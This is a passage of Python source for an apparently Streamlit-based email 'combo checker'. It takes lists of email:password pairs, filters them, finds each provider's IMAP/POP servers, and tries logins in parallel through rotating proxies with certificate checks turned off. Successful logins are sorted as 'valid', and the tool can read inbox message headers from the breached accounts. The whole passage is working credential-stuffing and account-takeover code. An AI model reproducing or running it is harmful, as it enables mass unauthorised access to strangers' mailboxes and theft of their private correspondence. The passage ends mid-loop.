    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}

COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne"
}

STRICT_APP_PROVIDERS = {
    "gmail.com", "googlemail.com",
    "outlook.com", "hotmail.com", "live.com", "windowslive.com"
}

ZERO_ACCESS_PROVIDERS = {
    "proton.me", "protonmail.com", "pm.me",
    "tuta.io", "tutanota.com", "tutamail.com", "tuta.com"
}

EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")

def is_disposable(email):
    try:
        return email.split("@")[-1].lower().strip() in DISPOSABLE
    except Exception:
        return False

def check_domain_resolvable(domain):
    with cache_lock:
        if domain in domain_cache and "resolvable" in domain_cache[domain]:
            return domain_cache[domain]["resolvable"]

    resolvable = False
    try:
        if dns:
            try:
                answers = dns.resolver.resolve(domain, "MX")
                if answers:
                    resolvable = True
            except Exception:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        resolvable = True
                except Exception:
                    pass
        if not resolvable:
            socket.gethostbyname(domain)
            resolvable = True
    except Exception as dns_err:
        resolvable = False
        warnings.warn(f"Domain resolution failed for {domain}: {dns_err}")

    with cache_lock:
        if domain not in domain_cache:
            domain_cache[domain] = {}
        domain_cache[domain]["resolvable"] = resolvable
    save_domain_cache()
    return resolvable

def load_previous_valid():
    seen = set()
    try:
        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            if os.path.exists(extra):
                paths.append(extra)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if ":" in line:
                            email, _ = line.split(":", 1)
                            email = email.strip().lower()
                            if email:
                                seen.add(email)
            except Exception:
                continue
        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
    except Exception as e:
        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
    return seen

def process_accounts(text, previous_valid):
    lines = []
    disp_list, typo_list, resume_list, app_skip_list, custom_list, dns_fail_list = [], [], [], [], [], []
    whitelist = CFG.get("CUSTOM_WHITELIST", [])
    blacklist = CFG.get("CUSTOM_BLACKLIST", [])

    try:
        for line in text.splitlines():
            line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            parts = line.split(":", 1)
            email = parts[0].strip().lower()
            password = parts[1].strip() if len(parts) > 1 else ""

            if not email or "@" not in email or not password:
                continue
                
            if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
                continue

            domain = email.split("@")[-1].lower()

            if whitelist and domain not in whitelist:
                custom_list.append(line)
                continue
            if blacklist and domain in blacklist:
                custom_list.append(line)
                continue

            if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
                app_skip_list.append(line)
                continue
            if is_disposable(email):
                disp_list.append(line)
                continue
            if domain in COMMON_TYPOS:
                typo_list.append(line)
                continue
            if email in previous_valid:
                resume_list.append(line)
                continue
            if ".." in email or email.count("@") != 1:
                continue
            
            if not check_domain_resolvable(domain):
                dns_fail_list.append(line)
                continue

            lines.append(f"{email}:{password}")
    except Exception as e:
        log_startup(f"WARNING: Error processing accounts input: {e}")

    seen_email, clean = set(), []
    for line in lines:
        try:
            em = line.split(":", 1)[0].strip().lower()
            if em not in seen_email:
                seen_email.add(em)
                clean.append(line)
        except Exception:
            continue

    log_startup(f"Processed account input. Clean valid count ready: {len(clean)} (Filtered DNS failures: {len(dns_fail_list)})")
    return clean, disp_list, typo_list, resume_list, app_skip_list, custom_list, dns_fail_list

# --- Main Input Section ---
str_lit.markdown("---")
str_lit.markdown("### 📥 Accounts Input & Pre-Filtering")

input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""

with input_tab1:
    raw_text = str_lit.text_area(
        "Paste accounts here (email:password format):",
        placeholder="user@example.com:password123",
        height=150
    )

with input_tab2:
    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"])
    if uploaded_file is not None:
        try:
            file_bytes = uploaded_file.getvalue()
            if not file_bytes:
                str_lit.warning("Uploaded file is empty.")
                raw_text = ""
            else:
                try:
                    raw_text = file_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    raw_text = file_bytes.decode("latin-1", errors="ignore")
                log_startup("Combo file uploaded and decoded successfully.")
                str_lit.success("File uploaded successfully!")
        except Exception as e:
            log_startup(f"ERROR: Failed decoding uploaded file: {e}")
            str_lit.error(f"Failed decoding uploaded file: {e}")
            raw_text = ""

clean_lines = []
disp, typo, resume, app_skip, custom_skipped, dns_skipped = [], [], [], [], [], []
if raw_text:
    previous_valid = load_previous_valid()
    clean_lines, disp, typo, resume, app_skip, custom_skipped, dns_skipped = process_accounts(raw_text, previous_valid)
    
    col_m1, col_m2, col_m3, col_m4, col_m5, col_m6, col_m7 = str_lit.columns(7)
    col_m1.metric("Ready to Check", len(clean_lines))
    col_m2.metric("Disposables", len(disp))
    col_m3.metric("Typos", len(typo))
    col_m4.metric("Resume Skipped", len(resume))
    col_m5.metric("App-Skipped", len(app_skip))
    col_m6.metric("Custom Filtered", len(custom_skipped))
    col_m7.metric("DNS Failed", len(dns_skipped))

    # --- Dropdown Inspector for Filtered Categories ---
    str_lit.markdown("#### 🔍 Filter Categories Content Inspector")
    filter_category_choice = str_lit.selectbox(
        "Select category to inspect contents:",
        options=[
            "Ready to Check",
            "Disposables",
            "Typos",
            "Resume Skipped",
            "App-Skipped",
            "Custom Filtered",
            "DNS Failed"
        ]
    )

    category_map = {
        "Ready to Check": clean_lines,
        "Disposables": disp,
        "Typos": typo,
        "Resume Skipped": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped
    }

    selected_list_items = category_map.get(filter_category_choice, [])
    if selected_list_items:
        str_lit.info(f"Showing **{len(selected_list_items)}** items for **{filter_category_choice}**:")
        str_lit.code("\n".join(selected_list_items), language="text")
    else:
        str_lit.info(f"No items in **{filter_category_choice}**.")

# --- Comprehensive Mail Checking Flow Integration ---
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com", "mail.gmail.com"], "pop3": ["pop.gmail.com", "mail.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com", "mail.gmail.com"], "pop3": ["pop.gmail.com", "mail.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com", "mail.outlook.com"], "pop3": ["outlook.office365.com", "mail.outlook.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com", "mail.hotmail.com"], "pop3": ["outlook.office365.com", "mail.hotmail.com"]},
    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com", "mail.live.com"], "pop3": ["outlook.office365.com", "mail.live.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com", "mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com", "mail.yahoo.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com", "mail.icloud.com"], "pop3": ["pop.mail.me.com", "mail.icloud.com"]},
    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com", "mail.naver.com"], "pop3": ["pop.naver.com", "mail.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com", "mail.qq.com"], "pop3": ["pop.qq.com", "mail.qq.com"]}
}

PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())

PARENT_PROVIDER_MAPPINGS = {
    "memoad.jp": "biglobe.ne.jp"
}

def get_mx_hosts(domain):
    if not dns: return []
    try:
        answers = dns.resolver.resolve(domain, "MX")
        sorted_records = sorted(answers, key=lambda x: x.preference)
        return [str(r.exchange).lower().rstrip(".") for r in sorted_records]
    except Exception as e:
        warnings.warn(f"DNS MX lookup failed for {domain}: {e}")
        return []

def detect_parent_provider(domain):
    if domain in PARENT_PROVIDER_MAPPINGS:
        return PARENT_PROVIDER_MAPPINGS[domain]
    
    mx_hosts = get_mx_hosts(domain)
    for m in mx_hosts:
        m_lower = m.lower()
        if "biglobe" in m_lower:
            return "biglobe.ne.jp"
        elif "google" in m_lower or "gmail" in m_lower:
            return "gmail.com"
        elif "outlook" in m_lower or "protection.outlook" in m_lower:
            return "outlook.office365.com"
        elif "yahoo" in m_lower:
            return "yahoo.com"
    return None

def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
    candidates = []
    # Place mail and imap explicitly at the very top of the priority list
    priority_prefixes = ['imap', 'mail', 'pop', 'pop3', 'secure', 'smtp']
    for prefix in priority_prefixes:
        candidates.append(f"{prefix}.{domain}")
    
    candidates.append(domain)
    
    if mx_records:
        for mx in mx_records:
            candidates.append(mx)
            parts = mx.split('.')
            if len(parts) >= 2:
                parent_domain = f"{parts[-2]}.{parts[-1]}"
                if parent_domain != domain:
                    for prefix in ['imap', 'mail', 'pop', 'pop3']:
                        candidates.append(f"{prefix}.{parent_domain}")

    return list(dict.fromkeys(candidates))

def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
        
        with cache_lock:
            if domain in domain_cache and "imap" in domain_cache[domain]:
                return domain_cache[domain]
                
        if domain in PROVIDER_MAP:
            return PROVIDER_MAP[domain]

        # FIX: Check if there is an explicit parent provider mapping first
        parent_domain = detect_parent_provider(domain)
        effective_domain = parent_domain if parent_domain else domain

        mx_records = get_mx_hosts(effective_domain)
        candidate_hosts = generate_candidate_hosts(effective_domain, mx_records)

        servers = {
            "imap": candidate_hosts,
            "pop": candidate_hosts,
            "pop3": candidate_hosts
        }
        
        with cache_lock:
            if domain not in domain_cache:
                domain_cache[domain] = {}
            domain_cache[domain]["imap"] = servers["imap"]
            domain_cache[domain]["pop"] = servers["pop"]
            domain_cache[domain]["pop3"] = servers["pop3"]
        save_domain_cache()
        return servers
    except Exception as e:
        warnings.warn(f"Error resolving servers for {email}: {e}")
        d = email.split('@')[-1] if '@' in email else 'localhost'
        fallback_patterns = generate_candidate_hosts(d, [])
        return {
            "imap": fallback_patterns,
            "pop": fallback_patterns,
            "pop3": fallback_patterns
        }

def precheck_proxy_fast(proxy_str):
    try:
        if not proxy_str:
            return True
        
        now = time.time()
        with proxy_lock:
            if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
                bad_proxies.add(proxy_str)
                return False

        info = parse_proxy(proxy_str)
        if not info or not SOCKS_OK:
            bad_proxies.add(proxy_str)
            return False

        precheck_timeout = float(CFG.get("PROXY_PRECHECK_TIMEOUT", 3))
        if not is_proxy_alive(info["host"], info["port"], timeout=precheck_timeout):
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            bad_proxies.add(proxy_str)
            return False

        return True
    except Exception:
        if proxy_str:
            bad_proxies.add(proxy_str)
        return False

def fast_fail_dns_check(host):
    try:
        socket.gethostbyname(host)
        return True
    except Exception:
        return False

def proxy_connect(host, port, proxy_str, timeout=None):
    if not fast_fail_dns_check(host):
        raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve")

    base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
        
    effective_timeout = max(2.0, base_timeout - (fails * 0.1))
    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        raise RuntimeError("bad proxy format or socks unavailable")

    if not is_proxy_alive(info["host"], info["port"], timeout=2):
        raise RuntimeError("proxy connect failed")

    sock = None
    proxy_types_to_try = []
    if SOCKS_OK and 'socks' in sys.modules:
        proxy_types_to_try = [socks.SOCKS5, socks.HTTP]

    for ptype in proxy_types_to_try:
        try:
            kwargs = {
                "proxy_type": ptype,
                "proxy_addr": info["host"],
                "proxy_port": info["port"]
            }
            if info["user"]:
                kwargs["proxy_username"] = info["user"]
                kwargs["proxy_password"] = info["pass"]
            sock = socks.create_connection(
                (host, port), timeout=effective_timeout, **kwargs
            )
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(CFG["TIMEOUT"])
            return sock
        except Exception as proxy_ex:
            warnings.warn(f"Proxy connection failed ({proxy_ex}), attempting fallback...")
            if sock:
                try: sock.shutdown(socket.SHUT_RDWR)
                except Exception: pass
                try: sock.close()
                except Exception: pass
                sock = None

    try:
        warnings.warn(f"All proxy routes failed for {host}:{port}. Initiating direct fallback connection.")
        direct_sock = socket.create_connection((host, port), timeout=effective_timeout)
        direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        direct_sock.settimeout(CFG["TIMEOUT"])
        return direct_sock
    except Exception as direct_ex:
        raise RuntimeError(f"Proxy and direct fallback connection both failed: {direct_ex}")

def ssl_wrap(sock, host, insecure=False):
    if sock is None:
        raise RuntimeError("SSL wrap failed completely: socket is None")
    
    ctx = ssl._create_unverified_context() if (insecure or CFG.get("ALLOW_SELF_SIGNED")) else ssl.create_default_context()
    
    try:
        fileno = sock.fileno()
        if fileno < 0:
            raise ValueError("Invalid socket file descriptor")
    except Exception as fd_err:
        raise RuntimeError(f"SSL wrap failed completely: [Errno 9] Bad file descriptor ({fd_err})")

    try:
        return ctx.wrap_socket(sock, server_hostname=host)
    except Exception as e:
        warnings.warn(f"Standard SSL wrap failed, falling back to unverified context: {e}")
        try:
            ctx_unverified = ssl._create_unverified_context()
            return ctx_unverified.wrap_socket(sock, server_hostname=host)
        except Exception as inner_e:
            if sock:
                try: sock.shutdown(socket.SHUT_RDWR)
                except Exception: pass
                try: sock.close()
                except Exception: pass
            raise RuntimeError(f"SSL wrap failed completely: {inner_e}")

def classify_error(err, domain=""):
    try:
        err_str = str(err).lower()
        if any(x in err_str for x in ["proxy connect failed", "timed out", "timeout", "connection refused", "network is unreachable", "name or service not known", "gaierror", "sockatmark", "reset by peer", "broken pipe", "fast-fail dns check failed", "socket.timeout", "connectionrefusederror"]):
            return "connection_failed"
        if domain in ZERO_ACCESS_PROVIDERS or any(k in err_str for k in ["zero-access", "bridge", "local connection"]):
            return "need_app_password"
        if "basic authentication is disabled" in err_str:
            return "need_app_password"
        if any(keyword in err_str for keyword in ["application-specific password", "app password", "two-factor", "mfa", "web login"]):
            return "need_app_password"
        if any(x in err_str for x in ["authentication failed", "login failed", "invalid credentials", "auth failed", "invalid login", "bad username", "command error", "logon failure", "-err [auth]", "no [authenticationfailed]"]):
            return "need_app_password" if domain in PUBLIC_PROVIDERS else "wrong_password"
    except Exception:
        pass
    return "connection_failed"

def record_proxy_attempt(proxy_str, success, is_network_error=False):
    try:
        if not proxy_str:
            return
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                if is_network_error:
                    consecutive_proxy_failures[proxy_str] += 1
                    if consecutive_proxy_failures[proxy_str] >= 6:
                        circuit_breaker_until[proxy_str] = time.time() + 30.0
                        bad_proxies.add(proxy_str)
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
    except Exception as e:
        warnings.warn(f"Error recording proxy attempt: {e}")

def imap_once(email, password, server, proxy_str=None, insecure=True):
    class PIMAP(imaplib.IMAP4_SSL):
        def open(self, host="", port=993, timeout=None):
            raw = None
            try:
                raw = proxy_connect(host, port, proxy_str, timeout=timeout) if proxy_str else socket.create_connection((host, port), timeout=timeout or CFG["TIMEOUT"])
                raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.sock = ssl_wrap(raw, host, insecure=True)
            except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
                if raw:
                    try: raw.shutdown(socket.SHUT_RDWR)
                    except Exception: pass
                    try: raw.close()
                    except Exception: pass
                raise socket_ex
            except Exception as ex:
                if raw:
                    try: raw.shutdown(socket.SHUT_RDWR)
                    except Exception: pass
                    try: raw.close()
                    except Exception: pass
                raise ex
    
    mail = None
    try:
        mail = PIMAP(server, timeout=CFG["TIMEOUT"])
        mail.login(email.strip(), password.strip())
        try: mail.noop()
        except Exception: pass
        try: mail.logout()
        except Exception: pass
    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
        if mail:
            try: mail.logout()
            except Exception: pass
        raise socket_ex
    except Exception as e:
        if mail:
            try: mail.logout()
            except Exception: pass
        raise e

def pop_once(email, password, server, proxy_str=None, insecure=True):
    raw = None
    ssock = None
    mail = None
    try:
        raw = proxy_connect(server, 995, proxy_str, timeout=CFG["TIMEOUT"]) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        ssock = ssl_wrap(raw, server, insecure=True)
        mail = poplib.POP3_SSL(server, timeout=CFG["TIMEOUT"])
        mail.sock = ssock
        mail._debugging = 0
        mail.user(email.strip())
        mail.pass_(password.strip())
        try: mail.noop()
        except Exception: pass
        try: mail.quit()
        except Exception: pass
    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
        if mail:
            try: mail.quit()
            except Exception: pass
        if raw and not ssock:
            try: raw.shutdown(socket.SHUT_RDWR)
            except Exception: pass
            try: raw.close()
            except Exception: pass
        raise socket_ex
    except Exception as e:
        if mail:
            try: mail.quit()
            except Exception: pass
        if raw and not ssock:
            try: raw.shutdown(socket.SHUT_RDWR)
            except Exception: pass
            try: raw.close()
            except Exception: pass
        raise e

def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
    for h in hosts:
        try:
            class PIMAPVerify(imaplib.IMAP4_SSL):
                def open(self, host="", port=993, timeout=None):
                    raw = None
                    try:
                        raw = proxy_connect(host, port, proxy_str, timeout=10) if proxy_str else socket.create_connection((host, port), timeout=10)
                        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                        self.sock = ssl_wrap(raw, host, insecure=True)
                    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
                        if raw:
                            try: raw.shutdown(socket.SHUT_RDWR)
                            except Exception: pass
                            try: raw.close()
                            except Exception: pass
                        raise socket_ex
                    except Exception as ex:
                        if raw:
                            try: raw.shutdown(socket.SHUT_RDWR)
                            except Exception: pass
                            try: raw.close()
                            except Exception: pass
                        raise ex
            mail = PIMAPVerify(h, timeout=10)
            mail.login(target_email.strip(), target_pass.strip())
            return True, mail, h
        except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError):
            raw_conn = None
            try:
                raw_conn = proxy_connect(h, 143, proxy_str, timeout=10) if proxy_str else socket.create_connection((h, 143), timeout=10)
                raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                mail = imaplib.IMAP4()
                mail.sock = raw_conn
                mail.welcome = mail._getresp()
                mail.starttls(ssl_context=ssl._create_unverified_context())
                mail.login(target_email.strip(), target_pass.strip())
                return True, mail, h
            except Exception:
                if raw_conn is not None:
                    try:
                        raw_conn.shutdown(socket.SHUT_RDWR)
                    except Exception:
                        pass
                    try:
                        raw_conn.close()
                    except Exception:
                        pass
                continue
        except Exception:
            continue
    return False, None, ""

def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
    mail = None
    try:
        conf_hosts = get_servers(email).get("imap", [server])
        verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
        if not verified or not mail:
            return ["Error reading mailbox: True credential verification failed."]
        
        mail.select("INBOX")
        typ, data = mail.search(None, "ALL")
        if typ != "OK":
            return ["No messages or folder empty."]
        ids = data[0].split()
        latest_ids = ids[-limit:] if len(ids) > limit else ids
        messages = []
        for mid in reversed(latest_ids):
            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ == "OK":
                for response_part in msg_data:
                    if isinstance(response_part, tuple):
                        messages.append(response_part[1].decode("utf-8", errors="ignore"))
        try: mail.noop()
        except Exception: pass
        try: mail.logout()
        except Exception: pass
        return messages if messages else ["No recent messages found."]
    except Exception as e:
        if mail:
            try: mail.logout()
            except Exception: pass
        return [f"Error reading mailbox: {str(e)}"]

def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    if trace_logs is None:
        trace_logs = []
        
    if CFG.get("FAST_MODE", True):
        ts = failed_domain_cache.get(domain)
        cooldown_period = CFG.get("FAILURE_COOLDOWN", 60.0)
        if ts and (time.time() - ts) < cooldown_period:
            trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. Skipping immediately.")
            return None, "connection_failed", "skipped_cooldown", None, trace_logs
        elif ts:
            failed_domain_cache.pop(domain, None)

    try:
        if conf.get("type") == "zero_access":
            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs

        proxy_mode = CFG.get("PROXY_MODE", "aggressive")
        prefer_insecure = True
        
        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy") or not precheck_proxy_fast(thread_state.get("sticky_proxy")):
                    available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
                    thread_state["sticky_proxy"] = random.choice(available_candidates) if available_candidates else None
                px = thread_state["sticky_proxy"]
            else:
                available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
                px = random.choice(available_candidates) if available_candidates else None
        
        proxies_to_try = [px] if px else [None]
        if proxy_mode == "fallback" and px:
            proxies_to_try.append(None)

        max_attempts = 1 if CFG.get("FAST_MODE", True) else min(len(conf.get("imap", [])), 6)

        for current_px in proxies_to_try:
            if current_px and not precheck_proxy_fast(current_px):
                continue

            for server in conf.get("imap", [])[:max_attempts]:
                trace_logs.append(f"[direct-sslsoft] Attempting IMAP -> Host: {server}:993")
                try:
                    imap_once(email, password, server, current_px, insecure=prefer_insecure)
                    record_proxy_attempt(current_px, success=True)
                    return server, "valid", f"[direct-sslsoft] IMAP | Host: {server} | Port: 993", current_px, trace_logs
                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                    st_val = classify_error(sock_err, domain)
                    record_proxy_attempt(current_px, success=False, is_network_error=True)
                    trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                    if st_val in ("wrong_password", "need_app_password"):
                        return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
                    continue
                except Exception as e:
                    st_val = classify_error(e, domain)
                    is_net = (st_val == "connection_failed")
                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                    trace_logs.append(f"[direct-sslsoft] -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                    if st_val in ("wrong_password", "need_app_password"):
                        return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
                    continue

            for server in conf.get("pop", [])[:max_attempts]:
                trace_logs.append(f"[direct-sslsoft] Attempting POP -> Host: {server}:995")
                try:
                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
                    record_proxy_attempt(current_px, success=True)
                    return server, "valid", f"[direct-sslsoft] POP | Host: {server} | Port: 995", current_px, trace_logs
                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                    st_val = classify_error(sock_err, domain)
                    record_proxy_attempt(current_px, success=False, is_network_error=True)
                    trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                    if st_val in ("wrong_password", "need_app_password"):
                        return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
                    continue
                except Exception as e:
                    st_val = classify_error(e, domain)
                    is_net = (st_val == "connection_failed")
                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                    trace_logs.append(f"[direct-sslsoft] -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                    if st_val in ("wrong_password", "need_app_password"):
                        return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
                    continue

    except Exception as e:
        trace_logs.append(f"[direct-sslsoft] Critical Exception in runner: {str(e)}")
        if CFG.get("FAST_MODE", True):
            failed_domain_cache[domain] = time.time()
        return None, "connection_failed", str(e)[:40], None, trace_logs

    if CFG.get("FAST_MODE", True):
        failed_domain_cache[domain] = time.time()
    return None, "connection_failed", "all hosts failed", None, trace_logs

# --- Execution Trigger & Persistent UI Display ---
str_lit.markdown("---")
str_lit.markdown("### 🚀 Execute Live Checking Engine")

col_action1, col_action2 = str_lit.columns([0.65, 0.35])
with col_action1:
    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
with col_action2:
    engine_action_mode = str_lit.selectbox(
        "Engine Action Mode:",
        options=[
            "Ready to Check",
            "Disposables",
            "Typos",
            "Resume Skipped",
            "App-Skipped",
            "Custom Filtered",
            "DNS Failed"
        ],
        index=0,
        help="Select the account category you would like the live checking engine to execute on."
    )

active_proxy_pool = get_filtered_active_proxies()

if start_engine_btn:
    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
    
    category_queue_map = {
        "Ready to Check": clean_lines,
        "Disposables": disp,
        "Typos": typo,
        "Resume Skipped": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped
    }
    
    accounts_to_check = category_queue_map.get(engine_action_mode, [])
    
    if not accounts_to_check:
        str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'. Please load or choose another category.")
    else:
        active_proxy_pool = get_filtered_active_proxies()
        
        with session_state_lock:
            str_lit.session_state.valid_results = []
            str_lit.session_state.wrong_results = []
            str_lit.session_state.need_app_results = []
            str_lit.session_state.conn_results = []
            str_lit.session_state.report_entries = []
            str_lit.session_state.log_lines = []
            str_lit.session_state.checked_emails_set = set()
            str_lit.session_state.last_checked_index = 0
                
            str_lit.session_state.engine_has_run = True
            str_lit.session_state.run_completion_status = "Running"
            
            start_dt = datetime.now()
            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.end_timestamp = None
            str_lit.session_state.total_duration = None
        
        progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
        status_text = str_lit.empty()
        
        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
        
        with exec_tab1:
            log_container = str_lit.empty()
        
        with exec_tab2:
            report_metrics_placeholder = str_lit.empty()
            report_log_container = str_lit.empty()

        all_target_accounts = accounts_to_check[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check

        total_accs = len(all_target_accounts)
        checked_count = 0
        thread_local = threading.local()
        
        def check_task(line):
            try:
                if ":" not in line: 
                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed", "trace": ["Invalid format"]}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                
                server, status, detail, px_used, trace = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email, "password": password, "status": status, "detail": detail, "trace": trace}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
            finally:
                if hasattr(thread_local, "state"):
                    try:
                        thread_local.state.clear()
                    except Exception:
                        pass

        try:
            current_workers = CFG["MAX_WORKERS_START"]
            if CFG.get("DYNAMIC_WORKER_SCALING", False):
                if total_accs > 500:
                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35, CFG["MAX_WORKERS_START"] * 2)
                elif total_accs < 20:
                    current_workers = max(2, min(5, total_accs))

            with ThreadPoolExecutor(max_workers=current_workers) as executor:
                future_to_line = {executor.submit(check_task, line): line for line in all_target_accounts}
                
                for index, future in enumerate(as_completed(future_to_line), 1):
                    checked_count += 1
                    try:
                        res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
                        if res:
                            st_val = res["status"]
                            em_val = res.get('email', '').strip().lower()
                            
